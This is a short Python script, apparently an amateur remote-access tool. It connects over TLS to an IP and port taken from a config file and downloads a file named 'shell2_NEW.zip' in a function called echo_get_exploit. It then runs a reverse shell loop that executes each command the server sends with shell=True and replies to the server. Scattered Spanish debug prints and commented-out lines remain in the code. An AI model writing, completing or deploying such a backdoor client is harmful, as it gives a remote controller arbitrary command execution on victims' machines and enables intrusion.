import sys
import socket
import ssl
import subprocess
import json


def get_json_data(json_file):
    return json.load(open(json_file))


def echo_get_exploit(s):
    print('la0')
    a = 0
    with open('shell2_NEW.zip', 'wb') as f:
        print ('file opened')
        while True:
            print('receiving data...')
            data = s.recv(8192)
            # print('data=%s', (data))
            if not data:
                break
            # write data to a file
            f.write(data)
            a += 1
            print ('la a: ', a)
            if a == 6:
                print('olaaaaa')
                break
        print('se fue')
    # f.close()
    #echo_client(s)
    # s.close()
    echo_client(s)
    # exit(2)


def echo_client(s):
    print('entra')
    while True:
        data = s.recv(8192)
        print(data.decode("utf-8"))
        response = subprocess.check_output(data, shell=True)
        # encoded = encode(response)
        # s.send(encoded)
        print(response)
        if data == b'':
            break
        s.send(b'This is a response.')
        print('Connection closed')
    s.close()


def main():
    config_data = get_json_data('config_w.json')

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Require a certificate from the server. We used a self-signed certificate
        # so here ca_certs must be the server certificate itself.
        ssl_sock = ssl.wrap_socket(s,cert_reqs=ssl.CERT_REQUIRED, ca_certs='cert')
        ssl_sock.connect((config_data['ip'], config_data['port']))
        echo_get_exploit(ssl_sock)
        # echo_client(ssl_sock)
        ssl_sock.close()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
            sys.exit(2)